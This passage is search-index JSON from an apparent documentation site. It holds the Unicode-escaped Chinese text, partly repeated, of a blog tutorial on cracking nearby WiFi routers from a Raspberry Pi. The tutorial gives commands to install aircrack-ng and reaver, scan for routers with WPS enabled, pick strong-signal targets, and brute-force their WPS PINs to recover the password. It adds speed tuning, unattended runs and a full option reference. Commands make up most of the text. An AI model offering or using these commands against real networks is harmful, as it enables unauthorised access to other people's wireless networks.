\u6ce8\u610f\u770b\u8fd9\u5f20\u5217\u8868\uff0c\u5217\u8868\u4e2d\u663e\u793a\u4e86\u4f60\u5468\u8fb9\u65e0\u7ebf\u7684\u76f8\u5173\u4fe1\u606f\u3002\u6ce8\u610f\u770b MB \u8fd9\u4e00\u5217\uff0c\u663e\u793a\u4e3a\" 54 \"\u3001\"54e. \"\u7b49\u7b49\uff0c\u8fd9\u8868\u793a\u4e86\u65e0\u7ebf\u5f53\u524d\u7684\u901f\u7387\u6a21\u5f0f\u4ee5\u53caWPS\u5f00\u542f\u72b6\u51b5\uff0c\u6211\u81ea\u5df1\u7684\u8def\u7531\u5668\u662f \"steve\"\uff0c\u6ce8\u610f\u770b\uff0c\u201d54e\u201c\u548c\u201d 54e. \u201c\u662f\u4e0d\u540c\u7684\uff0c\u591a\u4e86\u4e00\u4e2a \u70b9\uff0c\u8fd9\u4e2a\u70b9\u8868\u793a\u5f00\u542f\u4e86 wps\u6a21\u5f0f\u3002\u6240\u4ee5\u6211\u4eec\u4e0b\u9762\u5c31\u8fdb\u884cwps\u7684\u63a2\u6d4b\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u8981\u8bb0\u4f4fSSID\u5bf9\u5e94\u7684MAC\u5730\u5740\uff0c\u6b64\u540e\u6211\u4eec\u4f1a\u9488\u5bf9MAC\u5730\u5740\u8fdb\u884c\u653b\u51fb\u548c\u63a2\u6d4b\u3002 sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -vv \u662f\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f\u7684\uff0c\u7b49\u4f60\u719f\u7ec3\u4e86\u4e4b\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u4f7f\u7528 -v \uff0c\u8fd9\u6837\u5c31\u7b80\u5355\u4e86\u3002\u901a\u5e38\uff0c\u9047\u5230\u95ee\u9898\u624d\u4f1a\u4f7f\u7528 -vv \u3002 \u5982\u679c\u60f3\u6302\u673a\u7834\u89e3\uff0c\u8bb0\u5f97\u52a0\u4e0anohup\u547d\u4ee4\u540e\uff0c\u53ef\u4ee5\u65ad\u5f00ssh\u3002\u7136\u540e\u5269\u4e0b\u5c31\u662f\u7b49\u5f85\u3002 nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi & -o \u53c2\u6570\u662f\u8f93\u51fa\u5230\u6587\u4ef6 \u5982\u679c\u7834\u89e3\u6210\u529f\u540e\uff0c\u6253\u5f00\u8f93\u51fa\u7684\u65e5\u5fd7\uff0c\u5c31\u53ef\u4ee5\u770b\u5230reaver\u51fa\u6765\u7684\u5bc6\u7801\u3002 \u547d\u4ee4\u8bf4\u660e\uff1a reaver \u4f7f\u7528\u65b9\u6cd5\uff1a airmon-ng start wlan0 //\u542f\u52a8mon0\u76d1\u63a7 reaver -i mon0 -b MAC -a -S -vv //\u666e\u901a\u7528\u6cd5 \u5982\u679c\uff0c90.9%\u8fdb\u7a0b\u540e\u6b7b\u673a\u6216\u505c\u673a\uff0c\u8bf7\u8bb0\u4e0bPIN\u524d\u56db\u4f4d\u6570\uff0c\u7528\u6307\u4ee4\uff1a reaver -i mon0 -b MAC -a -vv -p XXXX(PIN\u524d\u56db\u4f4d\u6570) \u5176\u4ed6\u547d\u4ee4 airodump-ng mon0 \u7528\u6765\u626b\u63cf\u5468\u56f4\u65e0\u7ebf\u4fe1\u53f7 wash -i mon0 -C \u8fd9\u4e2a\u662f\u7528\u6765\u68c0\u6d4b\u5468\u56f4\u65e0\u7ebf\u652f\u6301PIN\u7684\u8def\u7531 \u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u5c1d\u8bd5\u52a0-N\u53c2\u6570 reaver -i mon0 -b xx:xx:xx:xx:xx:xx -d 0 -vv -a -S -N \u4e5f\u53ef\u4ee5\u52a0\u5ef6\u65f6 -t 3 -b 3 \u5e38\u7528\u53c2\u6570\u91ca\u7591 -i \u76d1\u542c\u540e\u63a5\u53e3\u540d\u79f0 \u7f51\u5361\u7684\u76d1\u89c6\u63a5\u53e3\uff0c\u901a\u5e38\u662fmon0 -b \u76ee\u6807mac\u5730\u5740 AP\u7684MAC\u5730\u5740 -a \u81ea\u52a8\u68c0\u6d4b\u76ee\u6807AP\u6700\u4f73\u914d\u7f6e -S \u4f7f\u7528\u6700\u5c0f\u7684DH key\uff0c\u53ef\u4ee5\u63d0\u9ad8PJ\u901f\u5ea6 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a -d \u5373delay\u6bcf\u7a77\u4e3e\u4e00\u6b21\u7684\u95f2\u7f6e\u65f6\u95f4 \u9884\u8bbe\u4e3a1\u79d2 reaver -i mon0 -b MAC -d 0 \u7528\u4e0a\u8ff0\u6307\u4ee4\u53ef\u4ee5\u5927\u5e45\u52a0\u5febPJ\u901f\u5ea6 \u4f46\u662f\u6709\u4e9bAP\u53ef\u80fd\u53d7\u4e0d\u4e86 -c \uff08\u540e\u8ddf\u9891\u9053\u6570\uff09 \u6307\u5b9a\u9891\u9053,\u53ef\u4ee5\u65b9\u4fbf\u627e\u5230\u4fe1\u53f7 -p PIN\u7801\u56db\u4f4d\u6216\u516b\u4f4d //\u5df2\u77e5pin\u7801\u524d4\u4f4d\u53ef\u4ee5\u5e26\u6b64\u53c2\u6570\uff0c\u6307\u5b9a\u4ece\u8fd9\u4e2a\u6570\u5b57\u5f00\u59cbpin\u3002\u53ef\u4ee5\u75288\u4f4d\u76f4\u63a5\u627e\u5230\u5bc6\u7801\u3002 -N \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -n \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -t \u5373timeout\u6bcf\u6b21\u7a77\u4e3e\u7b49\u5f85\u53cd\u9988\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5982\u679c\u4fe1\u53f7\u4e0d\u9519\uff0c\u53ef\u4ee5\u8fd9\u6837###\u8bbe\u7f6e reaver -i mon0 -b MAC -d 0 -t .5 -m, --mac= \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528 \u5c0f\u7ed3-PJ\u65f6\u5e94\u56e0\u72b6\u51b5\u8c03\u6574\u53c2\u6570: \u4fe1\u53f7 \u975e\u5e38\u597d: reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1 \u4fe1\u53f7\u666e\u901a: reaver -i mon0 -b MAC -a -S -vv -d .5 -t .5 -c 1 \u4fe1\u53f7\u4e00\u822c: reaver -i mon0 -b MAC -a -S -vv -c 1 \u5f53\u51fa\u73b0\u6709\u767e\u5206\u6570\u65f6\u4f60\u5c31\u53ef\u4ee5\u7528crtl+c\u6765\u6682\u505c\uff0c\u5b83\u4f1a\u5c06reaver\u7684\u8fdb\u5ea6\u8868\u6587\u4ef6\u4fdd\u5b58\u5728 1.3\u7248\uff1a /etc/reaver/MAC\u5730\u5740.wpc 1.4\u7248\uff1a /usr/local/etc/reaver/MAC\u5730\u5740.wpc \u7528\u8d44\u6e90\u7ba1\u7406\u5668\uff0c\u624b\u5de5\u5c06\u4ee5MAC\u5730\u5740\u547d\u540d\u7684\u3001\u540e\u8f8d\u4e3awpc\u7684\u6587\u4ef6\u62f7\u8d1d\u5230U\u76d8\u6216\u786c\u76d8\u4e2d\uff0c \u4e0b\u6b21\u91cd\u542f\u52a8\u540e\uff0c\u518d\u624b\u5de5\u590d\u5236\u5230/etc/reaver/ \u76ee\u5f55\u4e0b\u5373\u53ef\u3002 \u4e0d\u662f\u6240\u6709\u7684\u8def\u7531\u90fd\u652f\u6301pin\u5b66\u4e60\u3002AP\u5173\u95ed\u4e86WPS\u3001\u6216\u8005\u6ca1\u6709QSS\u6ef4\uff0c\u4f1a\u51fa\u73b0 WARNING: Failed to associate with XX:XX:XX:XX:XX:XX (ESSID: XXXX) \u5b66\u4e60\u8fc7\u7a0b\u4e2d\u4e5f\u53ef\u968f\u65f6\u968f\u5730\u6309Ctrl+C\u7ec8\u6b62PJ\uff0c\u91cd\u590d\u540c\u4e00\u4e2aPIN\u7801 \u6216 timeou t\u53ef\u7ec8\u6b62\uff0creaver\u4f1a\u81ea\u52a8\u4fdd\u5b58\u8fdb\u5ea6\u3002 \u7ee7\u7eed\u4e0a\u6b21\u7684PJ\uff0c\u5219\u518d\u6b21\u5728\u7ec8\u7aef\u4e2d\u53d1\u9001: reaver -i mon0 -b MAC -vv \u8fd9\u6761\u6307\u4ee4\u4e0b\u8fbe\u540e\uff0c\u4f1a\u8ba9\u4f60\u9009y\u6216n\uff0c\u9009y\u540e\u5c31\u7ee7\u7eed\u4e86 \u5f53reaver\u786e\u5b9a\u524d4\u4f4dPIN\u5bc6\u7801\u540e\uff0c\u5176\u5de5\u4f5c\u5b8c\u6210\u4efb\u52a1\u8fdb\u5ea6\u6570\u503c\u5c06\u76f4\u63a5\u8df3\u8dc3\u81f390.9%\u4ee5\u4e0a\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u5269\u4f59\u4e00\u5343\u4e2a\u5bc6\u7801\u7ec4\u5408\u4e86\uff08\u603b\u5171\u4e00\u4e07\u4e00\u5343\u4e2a\u5bc6\u7801\uff09\u3002 \u53c2\u6570\u8be6\u7ec6\u8bf4\u660e: -m, --mac= MAC of the host system \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528 -e, --essid= ESSID of the target AP \u8def\u7531\u5668\u7684ESSID\uff0c\u4e00\u822c\u4e0d\u7528\u6307\u5b9a -c, --channel= Set the 802.11 channel for the interface (implies -f) \u4fe1\u53f7\u7684\u9891\u9053\uff0c\u5982\u679c\u4e0d\u6307\u5b9a\u4f1a\u81ea\u52a8\u626b\u63cf -o, --out-file= Send output to a log file [stdout] \u6807\u51c6\u8f93\u51fa\u5230\u6587\u4ef6 -s, --session= Restore a previous session file \u6062\u590d\u8fdb\u7a0b\u6587\u4ef6 -C, --exec= Execute the supplied command upon successful pin recovery pin\u6210\u529f\u540e\u6267\u884c\u547d\u4ee4 -D, --daemonize Daemonize reaver \u8bbe\u7f6ereaver\u6210Daemon -a, --auto Auto detect the best advanced options for the target AP \u5bf9\u76ee\u6807AP\u81ea\u52a8\u68c0\u6d4b\u9ad8\u7ea7\u53c2\u6570 -f, --fixed Disable channel hopping \u7981\u6b62\u9891\u9053\u8df3\u8f6c -5, --5ghz Use 5GHz 802.11 channels \u4f7f\u75285G\u9891\u9053 -v, --verbose Display non-critical warnings (-vv for more) \u663e\u793a\u4e0d\u91cd\u8981\u8b66\u544a\u4fe1\u606f -vv \u53ef\u4ee5\u663e\u793a\u66f4\u591a -q, --quiet Only display critical messages \u53ea\u663e\u793a\u5173\u952e\u4fe1\u606f -h, --help Show help \u663e\u793a\u5e2e\u52a9 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a \u9ad8\u7ea7\u53c2\u6570: -p, --pin= Use the specified 4 or 8 digit WPS pin \u76f4\u63a5\u8bfb\u53d6psk\uff08\u672c\u4eba\u6d4b\u8bd5\u672a\u6210\u529f\uff0c\u5efa\u8bae\u7528\u7f51\u5361\u81ea\u5e26\u8f6f\u4ef6\u83b7\u53d6\uff09 -d, --delay= Set the delay between pin attempts 1 pin\u95f4\u5ef6\u65f6\uff0c\u9ed8\u8ba41\u79d2\uff0c\u63a8\u8350\u8bbe0 -l, --lock-delay= Set the time to wait if the AP locks WPS pin attempts [60] AP\u9501\u5b9aWPS\u540e\u7b49\u5f85\u65f6\u95f4 -g, --max-attempts= Quit after num pin attempts \u6700\u5927pin\u6b21\u6570 -x, --fail-wait= Set the time to sleep after 10 unexpected failures [0] 10\u6b21\u610f\u5916\u5931\u8d25\u540e\u7b49\u5f85\u65f6\u95f4\uff0c\u9ed8\u8ba40\u79d2 -r, --recurring-delay= Sleep for y seconds every x pin attempts \u6bcfx\u6b21pin\u540e\u7b49\u5f85y\u79d2 -t, --timeout= Set the receive timeout period [5] \u6536\u5305\u8d85\u65f6\uff0c\u9ed8\u8ba45\u79d2 -T, --m57-timeout= Set the M5/M7 timeout period [0.20] M5/M7\u8d85\u65f6\uff0c\u9ed8\u8ba40.2\u79d2 -A, --no-associate Do not associate with the AP (association must be done by another application) \u4e0d\u8fde\u5165AP\uff08\u8fde\u5165\u8fc7\u7a0b\u5fc5\u987b\u6709\u5176\u4ed6\u7a0b\u5e8f\u5b8c\u6210\uff09 -N, --no-nacks Do not send NACK messages when out of order packets are received \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -S, --dh-small Use small DH keys to improve crack speed \u4f7f\u7528\u5c0fDH\u5173\u952e\u503c\u63d0\u9ad8\u901f\u5ea6\uff08\u63a8\u8350\u4f7f\u7528\uff09 -L, --ignore-locks Ignore locked state reported by the target AP \u5ffd\u7565\u76ee\u6807AP\u62a5\u544a\u7684\u9501\u5b9a\u72b6\u6001 -E, --eap-terminate Terminate each WPS session with an EAP FAIL packet \u6bcf\u5f53\u6536\u5230EAP\u5931\u8d25\u5305\u5c31\u7ec8\u6b62WPS\u8fdb\u7a0b -n, --nack Target AP always sends a NACK [Auto] \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -w, --win7 Mimic a Windows 7 registrar [False] \u6a21\u62dfwin7\u6ce8\u518c\uff0c\u9ed8\u8ba4\u5173\u95ed Reference http://lok.me/a/1972.html http://bao3.blogspot.com/2013/05/raspberry-pi.html http://tieba.baidu.com/p/2682878857 http://www.nyaboron.moe/posts/606.html \u6587\u7ae0\u7248\u6743\u5f52 FindHao \u6240\u6709\u4e28\u672c\u7ad9\u9ed8\u8ba4\u91c7\u7528CC-BY-NC-SA 4.0\u534f\u8bae\u8fdb\u884c\u6388\u6743| \u8f6c\u8f7d\u5fc5\u987b\u5305\u542b\u672c\u58f0\u660e\uff0c\u5e76\u4ee5\u8d85\u94fe\u63a5\u5f62\u5f0f\u6ce8\u660e\u4f5c\u8005 FindHao \u548c\u672c\u6587\u539f\u59cb\u5730\u5740\uff1a https://www.findhao.net/easycoding/1184.html","title":"\u6811\u8393\u6d3ewifi\u7834\u89e3\u6574\u7406   FindHao"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#wifi","text":"","title":"\u6811\u8393\u6d3ewifi\u7834\u89e3[\u6574\u7406]"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_1","text":"\u6811\u8393\u6d3eB+\u4e00\u4e2a\uff08\u6211\u7528\u7684\u662fdebian\u73af\u5883\uff09 PC\u4e00\u53f0\uff08\u6216\u5176\u5b83\u8bbe\u5907\u76f4\u63a5\u64cd\u4f5cPI\u5c31\u884c\uff09 \u65e0\u7ebf\u7f51\u5361\uff08\u80fd\u7528\u5c31\u884c\uff0c\u4e0d\u8fc7\u5f3a\u5927\u7684\u65e0\u7ebf\u7f51\u5361\u4f1a\u4e8b\u534a\u529f\u500d\uff0c\u6211\u7528\u76843070\uff09 Find\u6ce8\uff1a \u65e0\u7ebf\u7f51\u5361\u4e0d\u662f\u54ea\u4e2a\u90fd\u884c\uff0c\u9700\u8981\u652f\u6301\u76d1\u542c\u6a21\u5f0f\u624d\u53ef\u4ee5\uff0c\u652f\u6301\u5217\u8868\u53ef\u4ee5\u67e5\u770b\u8fd9\u91cc\uff1a https://wikidevi.com/wiki/Wireless_adapters/Chipset_table","title":"\u786c\u4ef6\u73af\u5883"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_2","text":"sudo apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion ethtool sudo apt-get install -y libnl-3-200 libnl-3-dev libnl-genl-3-dev libnl-genl-3-200","title":"\u5b89\u88c5\u4f9d\u8d56\u5305"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#aircarck-ng","text":"svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng cd aircrack-ng/ make sudo make install \u8fd8\u63d0\u793a\u4e86Run 'airodump-ng-oui-update' as root (or with sudo) to install or update Airodump-ng OUI file (Internet connection required). sudo airodump-ng-oui-update","title":"\u5b89\u88c5aircarck-ng"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#reaver","text":"wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz tar zxvf reaver-1.4.tar.gz cd reaver-1.4/src ./configure make sudo make install \u4ee5\u4e0a\u4e24\u4e2a\u8d44\u6e90\u5305\u90fd\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230\uff1a \u767e\u5ea6\u7f51\u76d8\u5206\u4eab \u5982\u679c\u5b89\u88c5\u6210\u529f\u540e\uff0c\u4f1a\u6709 airmon-ng , airodump-ng , reaver \u7b49\u547d\u4ee4\u53ef\u7528\u3002","title":"\u5b89\u88c5reaver"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_3","text":"sudo airmon-ng start wlan0 sudo airodump-ng mon0 \u6839\u636e\u4e0a\u9762\u7684airodump\u641c\u7d22\u5230\u7684\u65e0\u7ebf\u4fe1\u53f7\uff0c\u7136\u540e\u53ef\u4ee5\u6311\u4fe1\u53f7\u5f3a\u7684\u8fdb\u884c\u7834\u89e3\uff08\u6ce8\u610f\uff0c\u8981\u9009\u62e9\u5f00\u4e86WPS\u529f\u80fd\u7684\uff09 \u6ce8\u610f\u770b\u8fd9\u5f20\u5217\u8868\uff0c\u5217\u8868\u4e2d\u663e\u793a\u4e86\u4f60\u5468\u8fb9\u65e0\u7ebf\u7684\u76f8\u5173\u4fe1\u606f\u3002\u6ce8\u610f\u770b MB \u8fd9\u4e00\u5217\uff0c\u663e\u793a\u4e3a\" 54 \"\u3001\"54e. \"\u7b49\u7b49\uff0c\u8fd9\u8868\u793a\u4e86\u65e0\u7ebf\u5f53\u524d\u7684\u901f\u7387\u6a21\u5f0f\u4ee5\u53caWPS\u5f00\u542f\u72b6\u51b5\uff0c\u6211\u81ea\u5df1\u7684\u8def\u7531\u5668\u662f \"steve\"\uff0c\u6ce8\u610f\u770b\uff0c\u201d54e\u201c\u548c\u201d 54e. \u201c\u662f\u4e0d\u540c\u7684\uff0c\u591a\u4e86\u4e00\u4e2a \u70b9\uff0c\u8fd9\u4e2a\u70b9\u8868\u793a\u5f00\u542f\u4e86 wps\u6a21\u5f0f\u3002\u6240\u4ee5\u6211\u4eec\u4e0b\u9762\u5c31\u8fdb\u884cwps\u7684\u63a2\u6d4b\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u8981\u8bb0\u4f4fSSID\u5bf9\u5e94\u7684MAC\u5730\u5740\uff0c\u6b64\u540e\u6211\u4eec\u4f1a\u9488\u5bf9MAC\u5730\u5740\u8fdb\u884c\u653b\u51fb\u548c\u63a2\u6d4b\u3002 sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -vv \u662f\u67e5\u770b\u8be6\u7ec6\u4fe1\u606f\u7684\uff0c\u7b49\u4f60\u719f\u7ec3\u4e86\u4e4b\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u4f7f\u7528 -v \uff0c\u8fd9\u6837\u5c31\u7b80\u5355\u4e86\u3002\u901a\u5e38\uff0c\u9047\u5230\u95ee\u9898\u624d\u4f1a\u4f7f\u7528 -vv \u3002 \u5982\u679c\u60f3\u6302\u673a\u7834\u89e3\uff0c\u8bb0\u5f97\u52a0\u4e0anohup\u547d\u4ee4\u540e\uff0c\u53ef\u4ee5\u65ad\u5f00ssh\u3002\u7136\u540e\u5269\u4e0b\u5c31\u662f\u7b49\u5f85\u3002 nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi & -o \u53c2\u6570\u662f\u8f93\u51fa\u5230\u6587\u4ef6 \u5982\u679c\u7834\u89e3\u6210\u529f\u540e\uff0c\u6253\u5f00\u8f93\u51fa\u7684\u65e5\u5fd7\uff0c\u5c31\u53ef\u4ee5\u770b\u5230reaver\u51fa\u6765\u7684\u5bc6\u7801\u3002","title":"\u7834\u89e3\u6559\u7a0b"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_4","text":"","title":"\u547d\u4ee4\u8bf4\u660e\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#reaver_1","text":"","title":"reaver"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_5","text":"airmon-ng start wlan0 //\u542f\u52a8mon0\u76d1\u63a7 reaver -i mon0 -b MAC -a -S -vv //\u666e\u901a\u7528\u6cd5","title":"\u4f7f\u7528\u65b9\u6cd5\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#909pin","text":"reaver -i mon0 -b MAC -a -vv -p XXXX(PIN\u524d\u56db\u4f4d\u6570)","title":"\u5982\u679c\uff0c90.9%\u8fdb\u7a0b\u540e\u6b7b\u673a\u6216\u505c\u673a\uff0c\u8bf7\u8bb0\u4e0bPIN\u524d\u56db\u4f4d\u6570\uff0c\u7528\u6307\u4ee4\uff1a"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_6","text":"airodump-ng mon0 \u7528\u6765\u626b\u63cf\u5468\u56f4\u65e0\u7ebf\u4fe1\u53f7 wash -i mon0 -C \u8fd9\u4e2a\u662f\u7528\u6765\u68c0\u6d4b\u5468\u56f4\u65e0\u7ebf\u652f\u6301PIN\u7684\u8def\u7531","title":"\u5176\u4ed6\u547d\u4ee4"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#pin-n","text":"reaver -i mon0 -b xx:xx:xx:xx:xx:xx -d 0 -vv -a -S -N \u4e5f\u53ef\u4ee5\u52a0\u5ef6\u65f6 -t 3 -b 3","title":"\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u5c1d\u8bd5\u52a0-N\u53c2\u6570"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#_7","text":"-i \u76d1\u542c\u540e\u63a5\u53e3\u540d\u79f0 \u7f51\u5361\u7684\u76d1\u89c6\u63a5\u53e3\uff0c\u901a\u5e38\u662fmon0 -b \u76ee\u6807mac\u5730\u5740 AP\u7684MAC\u5730\u5740 -a \u81ea\u52a8\u68c0\u6d4b\u76ee\u6807AP\u6700\u4f73\u914d\u7f6e -S \u4f7f\u7528\u6700\u5c0f\u7684DH key\uff0c\u53ef\u4ee5\u63d0\u9ad8PJ\u901f\u5ea6 -vv \u663e\u793a\u66f4\u591a\u7684\u975e\u4e25\u91cd\u8b66\u544a -d \u5373delay\u6bcf\u7a77\u4e3e\u4e00\u6b21\u7684\u95f2\u7f6e\u65f6\u95f4 \u9884\u8bbe\u4e3a1\u79d2 reaver -i mon0 -b MAC -d 0 \u7528\u4e0a\u8ff0\u6307\u4ee4\u53ef\u4ee5\u5927\u5e45\u52a0\u5febPJ\u901f\u5ea6 \u4f46\u662f\u6709\u4e9bAP\u53ef\u80fd\u53d7\u4e0d\u4e86 -c \uff08\u540e\u8ddf\u9891\u9053\u6570\uff09 \u6307\u5b9a\u9891\u9053,\u53ef\u4ee5\u65b9\u4fbf\u627e\u5230\u4fe1\u53f7 -p PIN\u7801\u56db\u4f4d\u6216\u516b\u4f4d //\u5df2\u77e5pin\u7801\u524d4\u4f4d\u53ef\u4ee5\u5e26\u6b64\u53c2\u6570\uff0c\u6307\u5b9a\u4ece\u8fd9\u4e2a\u6570\u5b57\u5f00\u59cbpin\u3002\u53ef\u4ee5\u75288\u4f4d\u76f4\u63a5\u627e\u5230\u5bc6\u7801\u3002 -N \u4e0d\u53d1\u9001NACK\u4fe1\u606f\uff08\u5982\u679c\u4e00\u76f4pin\u4e0d\u52a8\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u8fd9\u4e2a\u53c2\u6570\uff09 -n \u5bf9\u76ee\u6807AP\u603b\u662f\u53d1\u9001NACK\uff0c\u9ed8\u8ba4\u81ea\u52a8 -t \u5373timeout\u6bcf\u6b21\u7a77\u4e3e\u7b49\u5f85\u53cd\u9988\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5982\u679c\u4fe1\u53f7\u4e0d\u9519\uff0c\u53ef\u4ee5\u8fd9\u6837###\u8bbe\u7f6e reaver -i mon0 -b MAC -d 0 -t .5 -m, --mac= \u6307\u5b9a\u672c\u673aMAC\u5730\u5740\uff0c\u5728AP\u6709MAC\u8fc7\u6ee4\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528","title":"\u5e38\u7528\u53c2\u6570\u91ca\u7591"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/#-pj","text":"\u4fe1\u53f7 \u975e\u5e38\u597d: reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1 \u4fe1\u53f7\u666e\u901a: reaver -i mon0 -b MAC -a -S -vv -d .5 -t .5 -c 1 \u4fe1\u53f7\u4e00\u822c: reaver -i mon0 -b MAC -a -S -vv -c 1 \u5f53\u51fa\u73b0\u6709\u767e\u5206\u6570\u65f6\u4f60\u5c31\u53ef\u4ee5\u7528crtl+c\u6765\u6682\u505c\uff0c\u5b83\u4f1a\u5c06reaver\u7684\u8fdb\u5ea6\u8868\u6587\u4ef6\u4fdd\u5b58\u5728 1.3\u7248\uff1a /etc/reaver/MAC\u5730\u5740.wpc 1.4\u7248\uff1a /usr/local/etc/reaver/MAC\u5730\u5740.wpc \u7528\u8d44\u6e90\u7ba1\u7406\u5668\uff0c\u624b\u5de5\u5c06\u4ee5MAC\u5730\u5740\u547d\u540d\u7684\u3001\u540e\u8f8d\u4e3awpc\u7684\u6587\u4ef6\u62f7\u8d1d\u5230U\u76d8\u6216\u786c\u76d8\u4e2d\uff0c \u4e0b\u6b21\u91cd\u542f\u52a8\u540e\uff0c\u518d\u624b\u5de5\u590d\u5236\u5230/etc/reaver/ \u76ee\u5f55\u4e0b\u5373\u53ef\u3002 \u4e0d\u662f\u6240\u6709\u7684\u8def\u7531\u90fd\u652f\u6301pin\u5b66\u4e60\u3002AP\u5173\u95ed\u4e86WPS\u3001\u6216\u8005\u6ca1\u6709QSS\u6ef4\uff0c\u4f1a\u51fa\u73b0 WARNING: Failed to associate with XX:XX:XX:XX:XX:XX (ESSID: XXXX) \u5b66\u4e60\u8fc7\u7a0b\u4e2d\u4e5f\u53ef\u968f\u65f6\u968f\u5730\u6309Ctrl+C\u7ec8\u6b62PJ\uff0c\u91cd\u590d\u540c\u4e00\u4e2aPIN\u7801 \u6216 timeou t\u53ef\u7ec8\u6b62\uff0creaver\u4f1a\u81ea\u52a8\u4fdd\u5b58\u8fdb\u5ea6\u3002 \u7ee7\u7eed\u4e0a\u6b21\u7684PJ\uff0c\u5219\u518d\u6b21\u5728\u7ec8\u7aef\u4e2d\u53d1\u9001: reaver -i mon0 -b MAC -vv \u8fd9\u6761\u6307\u4ee4\u4e0b\u8fbe\u540e\uff0c\u4f1a\u8ba9\u4f60\u9009y\u6216n\uff0c\u9009y\u540e\u5c31\u7ee7\u7eed\u4e86 \u5f53reaver\u786e\u5b9a\u524d4\u4f4dPIN\u5bc6\u7801\u540e\uff0c\u5176\u5de5\u4f5c\u5b8c\u6210\u4efb\u52a1\u8fdb\u5ea6\u6570\u503c\u5c06\u76f4\u63a5\u8df3\u8dc3\u81f390.9%\u4ee5\u4e0a\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ea\u5269\u4f59\u4e00\u5343\u4e2a\u5bc6\u7801\u7ec4\u5408\u4e86\uff08\u603b\u5171\u4e00\u4e07\u4e00\u5343\u4e2a\u5bc6\u7801\uff09\u3002 \u53c2\u6570\u8be6\u7ec6\u8bf4\u660e: -m, --mac= MAC of the host system 